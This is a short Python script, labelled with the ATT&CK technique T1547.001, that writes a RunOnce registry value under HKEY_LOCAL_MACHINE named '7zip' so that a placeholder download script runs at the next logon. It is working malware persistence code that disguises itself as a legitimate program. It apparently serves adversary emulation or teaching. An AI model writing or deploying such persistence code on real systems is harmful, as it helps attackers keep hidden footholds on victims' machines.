'''
T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
'''

import winreg

hkey = winreg.HKEY_LOCAL_MACHINE
subkey = r'SOFTWARE\\Microsoft\Windows\\CurrentVersion\\RunOnce'

value = '<path_to_python> <path_to_download_script'
name = '7zip'

#modify RunOnce key
key = winreg.CreateKey(hkey, subkey)
print(f"{subkey} Opened Succesfully")
winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
key_value = winreg.QueryValueEx(key, name)
print(f"The value for {name} is {key_value[0]}")










